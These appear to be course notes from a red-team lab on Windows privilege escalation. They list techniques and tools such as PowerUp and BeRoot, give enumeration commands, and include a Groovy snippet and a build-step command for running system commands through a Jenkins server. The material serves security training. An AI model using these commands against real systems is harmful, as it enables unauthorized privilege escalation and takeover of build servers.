# Privesc Techniques
- Missing Patches
- Automated deployment and AutoLogon passwords in clear text
- AlwaysInstalledElevated
- Misconfigured Services
- DLL Hijacking

# Tools

- PowerUp: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
- BeRoot: https://github.com/AlessandroZ/BeRoot
- Privesc: https://github.com/enjoiz/Privesc

# PowerUp

#### Get services with unquoted paths and a space in their name
```powershell
Get-ServiceUnquoted -Verbose
```

#### Get services where the current user can write to its binary path or change arguments to the binary
```powershell
Get-ModifiableServiceFile -Verbose
```

#### Get services whose configuration current user can modify
```powershell
Get-ModifiableService -Verbose
```

# Run all checks from Tools

Powerup
`Invoke-AllChecks`

BeRoot
`.\beRoot.exe`

Privesc
`Invoke-PrivEsc`

# Features Abuse

• What we have been doing up to now (and will keep doing further in the class) is relying on features abuse.

• Features abuse are awesome as there are seldom patches for them and they are not the focus of security teams!

• One of my favorite features abuse is targeting enterprise applications which are not built keeping security in mind.

• On Windows, many enterprise applications need either Administrative privileges or SYSTEM privileges making them a great avenue for privilege escalation.

# Jenkins

• Jenkins is a widely used Continuous Integration tool.

• There are many interesting aspects with Jenkins but for now we would limit our discussion to the ability of running system commands on Jenkins.

• There is a Jenkins server running on dcorp-ci (172.16.3.11) on port 8080.

• Apart from numerous plugins, there are two ways of executingcommands on a Jenkins Master.

• If you have Admin access (default installation before 2.x), go to http://<jenkins_server>/script

#### In the script console, Groovy scripts could be executed.
```groovy
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = '[INSERT COMMAND]'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```

#### If you don't have admin access but could add or edit build steps in the build configuration. Add a build step, add "Execute Windows Batch Command" and enter:
```powershell
powershell –c <command>
```

• Again, you could download and execute scripts, run encoded scripts and more.

# Learning Objective 5

• Exploit a service on dcorp-studentx and elevate privileges to local administrator.

• Identify a machine in the domain where studentx has local administrative access.

• Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 - the dcorp-ci server.

